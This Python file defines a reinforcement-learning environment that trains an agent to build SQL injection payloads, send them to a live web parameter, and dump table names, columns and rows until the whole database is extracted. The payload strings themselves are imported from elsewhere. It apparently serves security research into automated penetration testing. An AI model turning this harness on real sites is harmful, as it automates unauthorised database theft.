from typing import Optional
import gymnasium as gym
from gymnasium import spaces
from gymnasium.utils.seeding import np_random

from .actions import atomSqliteDict, atomMysqlDict, atomPostgresqlDict,  operationsDict, tablesDict, HTTP_STATUS_DICT
from .error_msg import SQL_ERROR_PATTERNS

import numpy as np

import requests
from urllib.parse import urlparse, parse_qsl
from bs4 import BeautifulSoup


import re


from collections import Counter


class SqlEvaluationGym(gym.Env):
    metadata = None

    def __init__(self, target_url:str, target_param:str, cookies:dict = None, stage:int = 5, episode_length:int = 1000, 
                 dbms:str = "sqlite", info_index:int = 1):
        """Initialization of the evaluation Gymanisum environment.

        Args:
            target_url (str): Target URL including parameters.
            target_param (str): Name of the target parameter.
            cookies (dict, optional): Cookies to include in the session. Defaults to None.
            stage (int, optional): Curriculum stage used for reward shaping. Defaults to 5.
            episode_length (int, optional): Maximum number of steps per episode. Defaults to 1000.
            dbms (str, optional): Database dialect, e.g. 'sqlite', 'mysql', 'mariadb', or 'postgresql'. Defaults to "sqlite".
            info_index (int, optional): Column index for expected return. Defaults to 1.

        Raises:
            ValueError: If 'target_param' is not present in the URL query string.
        """        
        
        super().__init__()

        self.stage = stage
        self.episode_length = episode_length

        #Query creation parameters
        self.dbms = dbms
        self.information_index = info_index
        self.atomSqlDict = self.atomDictSwitch()
        #url and target params
        self.target_param = target_param
        parsed_url = urlparse(target_url)
        self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}" 
        self.default_params = dict(parse_qsl(parsed_url.query, keep_blank_values=True))

        if self.target_param not in self.default_params:
            raise ValueError(f"[-] Provided in target param {self.target_param!r} is not in the url: {self.default_params}")

        # session dealings
        self.session = requests.Session()
        self.session.cookies.update(cookies if cookies else {})
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
            })

        self.MAX_PAYLOAD_LENGTH = 128

        
        # -------- Action Space ---------
        self.select_action_tokens()

        # -------- Observation Space ---------
        self.MAX_OBS_LEN = 256
        #Edit - only the payload, not prefix and suffix
        self.observation_space = spaces.Dict({
            "payload": spaces.MultiDiscrete([len(self.atomSqlDict) +1 ] * self.MAX_PAYLOAD_LENGTH),  #+1 since I use 0 as padding 
            "response_categories": spaces.Box(low=0.0, high=1.0, shape=(3,), dtype=np.float32),
            "http_status": spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "has_tables": spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "has_columns": spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "order_index_norm":spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "has_column_count":spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "table_pointer":spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "table_count_norm":spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "current_table_done":spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
            "tables_extracted_ratio":spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float32),
        })

        # -------- Episode state ---------
        self.query_atoms = []
        self.current_step = 0
        self.last_response: str = ""
        self.last_sql: str = ""
        self.last_payload: str = ""
        self.used_payloads = set()
        self.executed = False


        # -------- Set the vulnerable query and correlating table. ---------

    #----- Set the stage for curriculum learning


    def atomDictSwitch(self):
        """Return the SQL atom dictionary for the configured DBMS.

        Returns:
            dict: Mapping of atom names to SQL fragments or callables.
        """        
        atomSwitch = {
            "sqlite": atomSqliteDict,
            "mysql": atomMysqlDict,
            "mariadb": atomMysqlDict,
            "postgresql": atomPostgresqlDict,
        }

        return atomSwitch.get(self.dbms, atomSqliteDict)
                
                

    def __get_obs(self) -> dict:
        """Build the current observation dictionary.

        The observation includes the payload atoms, response-category flags, HTTP status, and progress indicators for schema and data extraction.

        Returns:
            dict: Observation matching 'self.observation_space'.
        """

        ATOM_INDEX = {k: i+1 for i, k in enumerate(self.atomSqlDict.keys())}

        #response_categories = self.process_response_categories()
        response_vec = self.response_to_vec(self.response_categories)


        #For APSW training:
        if not self.last_status_code:
            self.last_status_code = 200

        payload_ids = [ATOM_INDEX[a] for a in self.query_atoms]
        payload_ids += [0] * (self.MAX_PAYLOAD_LENGTH - len(payload_ids))

        if self.TABLE_NAME_LIST:
            n_tables = len(self.TABLE_NAME_LIST)
            tables_extracted_ratio = len(self.EXTRACTED_TABLES) / n_tables
            table_done = 1.0 if self.TABLE_NAME_LIST[self.TABLE_LIST_POINTER] in self.EXTRACTED_TABLES else 0.0
            table_pointer = min(self.TABLE_LIST_POINTER, 100) / 100.0
            table_count_norm = min(n_tables, 100) / 100
        else:
            tables_extracted_ratio = 0.0
            table_done = 0.0
            table_pointer = 0.0
            table_count_norm = 0.0

        has_tables = 1.0 if len(self.TABLE_NAME_LIST) > 0 else 0.0
        has_columns = 1.0 if len(self.COLUMN_NAMES) > 0 else 0.0
        

        return {
            "payload": np.array(payload_ids, dtype=np.int64),
            "response_categories": response_vec,
            "http_status": np.array([self.last_status_code/1000], dtype=np.float32),
            "has_tables": np.array([has_tables], dtype=np.float32),
            "has_columns": np.array([has_columns], dtype=np.float32),
            "order_index_norm": np.array([self.order_index / 50], dtype=np.float32),
            "has_column_count": np.array([1.0 if self.column_count_correct else 0.0], dtype=np.float32),
            "table_pointer": np.array([table_pointer], dtype=np.float32),
            "table_count_norm": np.array([table_count_norm], dtype=np.float32),
            "current_table_done": np.array([table_done], dtype=np.float32),
            "tables_extracted_ratio": np.array([tables_extracted_ratio], dtype=np.float32),
        }

    def __get_info(self) -> dict:
        """Compute auxiliary information for debugging.

        Returns:
            dict: Info with distance between agent and target
        """
        return {
            "sql": self.last_payload,
            "response_str": self.last_response,
            "num_unique_payloads": len(self.used_payloads)
            }
    
    def response_to_vec(self, rc):
        """convert response-category flags into float Numpy vector."""
        return np.array([
            float(rc["grammar_valid"]),
            float(rc["sql_error"]),
            float(rc["stagnation_signal"]),
        ], dtype=np.float32)
    

    def reset(self, *, seed: Optional[int] = None, options=None): 
        """Reset the environment state and start a new episode.

        Args:
            seed: Random seed for reproducible episodes
            options: Additional configuration. Currently unused

        Returns:
            tuple: (observation, info) for the initial state
        """
        super().reset(seed=seed)


        #set the tokens after the stage:

        # --------Reset environment State -----------------


        
        self.executed = False
        self.consecutive_non_exec = 0
        self.repeated_response_count = 0
        self.known_max_columns = 0
        self.current_step = 0
        self.last_response = ""
        self.last_sql = ""
        self.last_payload = ""
        self.last_status_code = 0

        self.used_payloads = set()
        
        self.TABLE_NAME_LIST = []
        self.TABLE_LIST_POINTER = 0
        self.extraction_table = None
        self.EXTRACTED_TABLES = []   #MUST IMPLEMENT
        self.COLUMN_NAMES = []

        #For stage 6, comparison of total extracted rows.
        self.TOTAL_EXTRACTED_ROWS = 0

        self.last_payload_exec = None
        self.last_response_hash = None
        self.target_column_count = 0
        self.tested_indices = set()

        #Variables to parse and handle environmental responses. 
        self.last_execute_sql_error = 0.0
        
        # ----------Reset payload array ----------------
        self.query_atoms = []
        # Number of columns
        self.order_index = 1
        self.order_roof = False  # A signal to introduce that the order index roof has been reached. 
        self.column_count_correct = False
        #What the last order index was when the agent executed that got 200..
        self.last_order_index = 1

        #reset response categories:
        self.response_categories = self.process_response_categories()

        #reset the original content of the page. Initiate with None first, to avoid comparison.
        self.old_result = None
        self.old_result, _ = self.execute_query(payload="")

        # ---------- Set reward params ----------------        

        self.prev_phi = 0.0
        self.gamma = 0.99

        obs, info = self.__get_obs(), self.__get_info()
        #info["action_mask"] = self.get_action_mask()

        return obs, info
    
    def step(self, action:dict[str|int]) -> tuple:
        """Execute one timestep within the environment.

        Args:
            action (int): The selected action index of the 'operationsDict' to take.

        Returns:
            tuple: (observation, reward, done, truncated, info)
        """
        self.current_step += 1        

        # ----- SELECT APROPRIATE ACTION -----------
        op_choice = int(action)
        self.op_name = operationsDict[op_choice]

        reward = 0.0
        penalty = 0.0

        done = False 
        truncated = False

        illegal_action = False
        reused_payload = False

        sL_index, cO_index = self.get_escapeChar_index()

        if self.op_name != "EXECUTE":
            self.executed = False
            self.last_status_code = 0
            self.consecutive_non_exec += 1
        else:
            self.consecutive_non_exec = 0
       
        if self.op_name == "REMOVE_LAST_ATOM":
            if self.query_atoms:
                success = self.query_atoms.pop()
                if not success:
                    penalty -= 0.1
            else:
                penalty -= 0.1

         #Escape
        elif self.op_name == "ADD_STRING_LITERAL":
            success = self.add_atom("STRING_LITERAL")
            if not success:
                penalty -= 0.1

        elif self.op_name == "ADD_SQL_COMMENT":
            if self.stage >= 2:
                if not "SQL_COMMENT" in self.query_atoms:
                    success = self.add_atom("SQL_COMMENT")
                    if not success:
                        penalty -= 0.1
                else:
                    penalty -= 0.5
            else:
                success = self.add_atom("SQL_COMMENT")
                if not success:
                    penalty -= 0.1

        
        elif self.op_name == "ADD_OR_TRUE":
            success = self.add_atom("OR_TRUE")
            if not success:
                penalty -= 0.1
        
        elif self.op_name == "INCREMENT_ORDER_INDEX":
            if self.column_count_correct:
                penalty -= 0.1
            else:
                self.order_index += 1


        elif self.op_name == "DECREMEMT_ORDER_INDEX":
            if self.column_count_correct:
                penalty -= 0.1
            else:
                self.order_index = max(1, self.order_index - 1)


        # escape
        elif self.op_name == "UNION_SQLITE_MASTER":
            if "UNION_SQLITE_MASTER" in self.query_atoms:
                illegal_action = True
                if self.stage >= 3:
                    penalty -= 0.8
            if self.stage >= 4 and self.TABLE_NAME_LIST:
                illegal_action = True
                penalty -= 0.2
            else:
                index = self.locate_clause_index()
                success = self.add_atom("UNION_SQLITE_MASTER", index=index)
                if not success:
                    reward -= 0.1
                    penalty -= 0.1

        #requires table names. 
        elif self.op_name == "UNION_SQLITE_COLUMN":
            if "UNION_SQLITE_COLUMN" in self.query_atoms or not self.TABLE_NAME_LIST:
                illegal_action = True
                if self.stage >= 3:
                    penalty -= 0.2
            else:
                index = self.locate_clause_index()
                success = self.add_atom("UNION_SQLITE_COLUMN", index=index)
                if not success:
                    penalty -= 0.1
        
        elif self.op_name == "UNION_CURRENT_TABLE":
            if "UNION_CURRENT_TABLE" in self.query_atoms and not self.COLUMN_NAMES:
                illegal_action = True
                if self.stage >= 3:
                    penalty -= 0.8
            if self.stage >= 5 and (not self.TABLE_NAME_LIST or not self.COLUMN_NAMES):
                illegal_action = True
                penalty -= 0.2
            else:
                index = self.locate_clause_index()
                success = self.add_atom("UNION_CURRENT_TABLE", index=index)
                if not success:
                    penalty -= 0.1

        elif self.op_name == "NEXT_TABLE":
            if self.TABLE_NAME_LIST:
                self.TABLE_LIST_POINTER = (self.TABLE_LIST_POINTER + 1) % len(self.TABLE_NAME_LIST)
                self.last_response = ""
                self.COLUMN_NAMES = [] # reset column names.
                self.order_roof = False
            else:
                penalty -= 0.1


        # Execution.
        if self.op_name == "EXECUTE":
            payload = ""
            for atom in self.query_atoms:
                sql_piece = self.atomSqlDict[atom]
                payload += sql_piece(self) if callable(sql_piece) else sql_piece
            
            response, self.last_status_code = self.execute_query(payload=payload)
            self.last_payload = payload

            self.last_response_html = response

            current_response_hash = hash(str(self.last_response_html))
            
            last_payload_hash = hash(payload)
            
            if current_response_hash == self.last_response_hash:
                self.repeated_response_count += 1  #Rename variable to align with stagnation
            else:
                self.repeated_response_count = 0

            if last_payload_hash in self.used_payloads:
                reused_payload = True
            else:
                #Set the last payload and add to set.
                self.last_payload_exec = last_payload_hash
                self.used_payloads.add(last_payload_hash)

            #Set last response as prior. 
            self.last_response = response
            self.last_response_hash = current_response_hash

            self.executed = True

            content_error = self.detect_error_strings()
            if content_error:
                #call all errors for 500
                self.last_status_code = 500

            # set variables based on the return
            if isinstance(response, str) or content_error:
                self.last_execute_sql_error = 1.0
            elif isinstance(response, list) and content_error:
                self.last_execute_sql_error = 1.0
            else:
                self.last_execute_sql_error = 0.0


            if self.last_status_code == 200 and self.last_execute_sql_error == 0.0:
                self.last_order_index = self.order_index


            if not content_error:
                if "UNION_SQLITE_MASTER" in self.query_atoms:
                    tablenames = self.extract_table_names(response)
                    if tablenames:
                        self.TABLE_NAME_LIST = tablenames
                        print(f"[!] Found table names: {self.TABLE_NAME_LIST}")
                        self.column_count_correct = True

                if "UNION_SQLITE_COLUMN" in self.query_atoms:
                    column_names = self.extract_column_names(response)
                    if column_names:
                        self.COLUMN_NAMES = column_names
                        print(f"[!] Found column names: {self.COLUMN_NAMES}")

                if self.COLUMN_NAMES:
                    if "UNION_CURRENT_TABLE" in self.query_atoms:
                        if isinstance(response, list): 
                            current_target = self.TABLE_NAME_LIST[self.TABLE_LIST_POINTER]
                            if current_target not in self.EXTRACTED_TABLES:
                                if current_target in payload:
                                    self.EXTRACTED_TABLES.append(current_target)
                                    self.TOTAL_EXTRACTED_ROWS += len(response)
                                    print(f"[*] Successfully extracted table: {current_target} | Extracted rows: {len(response)} | Total Extracted rows: {self.TOTAL_EXTRACTED_ROWS} | Total extracted tables: {len(self.EXTRACTED_TABLES)}")

        #get reward for action based on atoms and / or response:
        #reduce for stage 6, since ep.length is longer. penalty is negative
        if self.stage == 6:
            penalty *= 0.0
        reward += penalty

        #Reward for endstate and phi
        _reward, done = self.get_reward(illegal_action, reused_payload)
        reward += _reward

        if self.current_step >= self.episode_length:
            if not self.executed:
                reward -= 0.5
            truncated = True
            reward -= 5.0
            

        return self.__get_obs(), reward, done, truncated, {
                **self.__get_info(),
            }

    def detect_error_strings(self) -> bool:
        """Check whether the last response contains any of the predefined SQL error patterns.

        Returns:
            bool: True if any content of in the response matches any predefined error messages. 
        """        
        if isinstance(self.last_response, list):
            text = "\n".join(map(str,self.last_response))
        else:
            text = str(self.last_response)
        text = text.lower()
        text = re.sub(r"\s+", " ", text)

        return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)



    def extract_column_names(self, response) -> list:
        """Extract column names from a schema-discovery response.

        For SQLite, it parses 'CREATE TABLE' statements and extracts the column identifiers from the statement.
        For MySQL and MariaDB, the response is assumed to contain the column names.

        Args:
            response: Parsed target response.

        Returns:
            list: Extracted column names.
        """        
        SKIP_ITEMS = {"PRIMARY","FOREIGN","CONSTRAINT","UNIQUE","CHECK","KEY","REFERENCES"}
        column_names = []
        # check if the response is a list. The first tuple in the list is the CREATE table
        match self.dbms:
            case "sqlite":
                if isinstance(response, list):
                    try:
                        for element in response:
                            # Check if the tuple contains the SQL string (in index 0, since we are looking at null columns)
                            if isinstance(element, str) and "CREATE TABLE" in element:
                                start_idx = element.find('(')
                                end_idx = element.rfind(')')
                                
                                if start_idx != -1 and end_idx != -1:
                                    inner_content = element[start_idx + 1:end_idx].strip()
                                    
                                    # Split by comma ONLY if it's not inside nested parentheses
                                    column_definitions = re.split(r',\s*(?![^()]*\))', inner_content)
                                    for col_def in column_definitions:
                                        # Clean up whitespace and newlines
                                        clean_def = col_def.strip()
                                        if clean_def:
                                            # The first word is always the column name
                                            column_name = clean_def.split()[0]
                                            if column_name.upper() in SKIP_ITEMS:
                                                continue
                                            column_names.append(column_name)
                    except Exception as exc:
                        pass
            case "mysql" | "mariadb":
                column_names = response
        return column_names

    def execute_query(self, payload:str = "") -> tuple[str, int]:
        """Function to send the payload string to the target, and receive the response.

        Args:
            payload (str, optional): Generated SQL injection payload to replace the target parameter.

        Returns:
            tuple[str, int]: Returns the response string and the HTTP response code.  
        """        
        params = self.default_params.copy()
        params[self.target_param] = payload

        try:
            response_raw = self.session.get(self.base_url, params=params, timeout=5)
            status_code = response_raw.status_code
    

            if status_code == 500:
                response = response_raw.url
            elif status_code == 200:
                response = self.parse_html_return(response_raw)
                
        except requests.RequestException as ReqExc:
            status_code = 500
            response = ""
            print(f"Error while sending payload: {ReqExc!r}")
        finally:
            self.last_payload = payload
            return response, status_code


    def parse_html_return(self, response) -> list:
        """Parse an HTTP response and extract table-cell content from HTML tables.
            
        Each '<tr>' element is iterated, extracting and converting the text from each subordinated '<td>'. The converted text is compared to a baseline response.
        Only new response lines are returned

        Args:
            response (html): Raw HTTP response from the target

        Returns:
            list: Extracted row content, filtered against the baseline response.
        """
        
        lines = []

        soup = BeautifulSoup(response.text, "html.parser")

        for tr in soup.find_all("tr"):
            cells = [td.get_text(" ", strip=True) for td in tr.find_all("td")]
            cells = [c for c in cells if c]  # drop empty cells
            
            if cells:
                lines.append("|".join(cells))
        
        if self.old_result:
            return self.compare_returned_lines(lines=lines)
        else:
            return lines
        

    def compare_returned_lines(self, lines) -> list:
        """Return lines that are new compared to the baseline response

        Args:
            lines (list): List of lines from the current response

        Returns:
            list: List of lines that are new relative to the baseline response.
        """        
        old_counts = Counter(self.old_result)
        new_counts = Counter(lines)

        injected_counts = new_counts - old_counts

        new_injected_lines = []
        for line, count in injected_counts.items():
            new_injected_lines.extend([line] * count)

        new_injected_lines = [line.split("|")[0].strip() for line in new_injected_lines]

        return new_injected_lines

        
    def extract_table_names(self, response) -> list:
        """Extract table names from a parsed response.

        Args:
            response: Parsed response data.

        Returns:
            list: List of table names if the response is a list, else empty list.
        """        
        try:
            if isinstance(response, list):
                tablenames = response
            else:
                tablenames = []
        except:
                pass
        finally:
            return tablenames
        
    def locate_clause_index(self) -> Optional[int]:
        """Find the index of the first clause-like atom in the current payload. """
        clause_list = ["ORDER_BY", "UNION_SQLITE_MASTER", "UNION_SQLITE_COLUMN", "UNION_CURRENT_TABLE"]
        for index, atom in enumerate(self.query_atoms):
            if atom in clause_list:
                return index
        return None

    def add_atom(self, atom, index=None) -> bool:
        """Insert or replace an atom in the current payload.

        Args:
            atom: Atom name to add
            index (optional): Optional index to replace instead of appending. Defaults to None.

        Returns:
            bool: True if the atom was added or replaced, otherwise False
        """        
        self.executed = False
        if index is not None:
            self.query_atoms[index] = atom
            return True

        if len(self.query_atoms) < self.MAX_PAYLOAD_LENGTH-1:
            #Append the atom to the list
            self.query_atoms.append(atom)
            return True
        return False


    def remove_atom(self, atom) -> bool:
        """Remove the last occurence of an atom in the current payload

        Args:
            atom: Atom name to remove.

        Returns:
            bool: True if an atom was removed, otherwise False.
        """        
        self.executed = False
        #Remove the last occurence of the atom
        if atom in self.query_atoms:
            for i in range(len(self.query_atoms) -1, -1, -1):
                if self.query_atoms[i] == atom:
                    self.query_atoms.pop(i)
                    return True
        else:
            return False    
    
    def process_response_categories(self) -> dict[str, bool]:
        """"
        Analyzes the last execution and determining the capability level of the query, used for dynamic rewarding
        """
        response_categories = {

            "grammar_valid": False,     #grammar valid and query executed
            "sql_error": False,         # query that triggers a 500 response
            "stagnation_signal": False,  #Whether the last 3 executes provided 0 new putput
        }

        stagn_response = 1.0 if self.repeated_response_count >= 3 else 0.0
        stagn_exec = 1.0 if self.consecutive_non_exec >= 5 else 0.0
        #Stagnation signal based on received repeated signals. 
        response_categories['stagnation_signal'] = 1.0 if stagn_response or stagn_exec else 0.0
        

        #This is only valid if a query has been executed. 
            #sql error and grammar
        response_categories["sql_error"] = float(getattr(self, "last_execute_sql_error", 0.0))
        response_categories["grammar_valid"] = 1.0 if response_categories["sql_error"] == 0.0 else 0.0

        return response_categories


    def get_escapeChar_index(self) -> tuple[int | float, int | float]:
        """Identifies the index of escape characters, or float('inf') if not found.

        Returns:
            tuple[int | float, int | float]: The index of the string literal and sql-comment mark. Optionally float('inf').
        """        
        try:
            sL_index = self.query_atoms.index("STRING_LITERAL")
        except ValueError:
            sL_index = float('inf')
        try:
            cO_index = self.query_atoms.index("SQL_COMMENT")
        except ValueError:
            cO_index = float('inf')
        return sL_index, cO_index

    def compute_phi(self) -> float:
        """Compute the current potential used for reward shaping. 

        The potential combines structural progress in payload construction with extraction progress, such as discovering tables, columns and completed tables.

        Returns:
            float: The potential value for the potential-based reward shaping.
        """
        phi = 0.0

        ## --- Dynamic potential 
        ## Adds phi based on execution. response_categories is a signal to the agent. 

        self.response_categories = self.process_response_categories() 
        sL_index, cO_index = self.get_escapeChar_index()

        # ----- Stage guard. Penalize bad semantics across all stages:      
        ghost_penalty = 0.1
        #Check string litteral.
        if sL_index != float('inf'):
            phi += 0.1
            if sL_index == 0:
                phi += 0.2
            else:
                phi -= ghost_penalty * sL_index
        
        #Check comment placement.
        if cO_index != float('inf'):
            phi += 0.1
            last_index = len(self.query_atoms) - 1
            if cO_index == last_index:
                phi += 0.2
            else:
                dead_atoms_count = last_index - cO_index
                phi -= ghost_penalty * dead_atoms_count


        #Only the highest tier counts, to ensure phi-now detection works if there are sudden "bad" changes. 

        if self.column_count_correct:
            phi += 0.05

        if self.TABLE_NAME_LIST:
            phi += 0.1
            #reward for progress towards extracting all tables. 
            completion_ratio = len(self.EXTRACTED_TABLES) / len(list(tablesDict.keys()))
            phi += completion_ratio * 0.4

            current_table = self.TABLE_NAME_LIST[self.TABLE_LIST_POINTER]
            if current_table in self.EXTRACTED_TABLES:
                if self.op_name == "NEXT_TABLE":
                    phi += 0.15
            if current_table not in self.EXTRACTED_TABLES:
                if self.COLUMN_NAMES:
                    phi += 0.1
        return phi

    def calculate_pbrs_reward(self, phi_now: float) -> float:
        """Compute the potential-based shaping reward from the current potential

        Args:
            phi_now (float): Current state's potential

        Returns:
            float: Current shaping reward
        """        
        phi_prev = self.prev_phi
        self.prev_phi = phi_now
        return self.gamma * phi_now - phi_prev


    def get_reward(self, illegal_action: bool, reused_payload: bool) -> tuple[float, bool]:
        """Compute reward and terminal condition for the current step.

        Args:
            illegal_action (bool): Whether the current action violated environment rules.
            reused_payload (bool): Whether the current payload has already been tried.

        Returns:
            tuple[float, bool]: Tuple consisting of the step reward and if the terminal condition has been met.
        """        
        sL_index, cO_index = self.get_escapeChar_index()
        done = False
        reward = 0.0

        new_rows = set()

        phi_now = self.compute_phi()
        reward += self.calculate_pbrs_reward(phi_now)


        #Penalizing structural and bad actions
        if illegal_action:
            reward -= 0.05 if self.stage < 6 else 0.005
        if reused_payload:
            reward -= 0.1 if self.stage < 6 else 0.005

        penalties = len(re.findall(r"'{2,}|--{2,}", self.last_payload))
        reward -= 0.02 * penalties if self.stage < 6 else 0.02

        if self.op_name == "EXECUTE":
            if len(self.query_atoms) == 0:
                reward -= 0.1
        
        #Specific win conditions
        success = False 

        #Win condition on 
        if self.TABLE_NAME_LIST and self.EXTRACTED_TABLES:
            success = Counter(self.EXTRACTED_TABLES) == Counter(self.TABLE_NAME_LIST)
        if success:
            print(f"[+] Successfully extracted database: Total Extracted rows: {self.TOTAL_EXTRACTED_ROWS} | Total extracted tables: {len(self.EXTRACTED_TABLES)}/{len(self.TABLE_NAME_LIST)} | Extracted tables: {self.EXTRACTED_TABLES}")

        if success:
            terminal_reward = 5.0
            #To aid the agent and critic in evaluating the attempt, we need to normalize the step usage of a 3 column target and a 27 column target. 
            #The steps taken is normalized by steps taken by each column
            #100 steps for 27 columns are better than 100 steps for 3 columns.

                #Complexity buffer is the steps we set as between efficient and non efficient. 
            complexity_buffer = (self.target_column_count * 3) + (len(self.TABLE_NAME_LIST) * 5) #a max of 27 * 3 + 11 * 10 == 191
            efficiency_ratio = self.current_step / complexity_buffer

            if efficiency_ratio <= 1.0:
                efficiency_penalty = -(2.0 - efficiency_ratio) * 1.0
            else:
                efficiency_penalty = min(2.0, (efficiency_ratio - 1.0) * 1.0)

            
            terminal_reward -= efficiency_penalty

            print(f"[+] TARGET EXTRACTED SOLVED | Step: {self.current_step} | Complexity: {self.target_column_count} | Tables Extracted: {len(self.EXTRACTED_TABLES)} | Total Rows Extracted: {self.TOTAL_EXTRACTED_ROWS} | Reward: {terminal_reward}")

            return terminal_reward, True

        return reward, done 


    def render(self, human:bool = False):
        """Render the environment for human viewing.

        Args:
            human (bool, optional): Boolean switch for human viewing. Defaults to False. Reserved for future human-readable rendering.
        """        
        pass

    def close(self):
        """Release external resources used by the environment.

        Args:
            pass
            
        Returns:
            pass
        """
        #Close the APSW connection?
        if self.session:
            self.session.close()

    def select_action_tokens(self):
        self.set_action_space()

    def set_action_space(self) -> spaces.Dict:
        """Create the environment's discrete action space."""
        self.action_space = spaces.Discrete(len(operationsDict))
            

if __name__ == "__main__":
    print()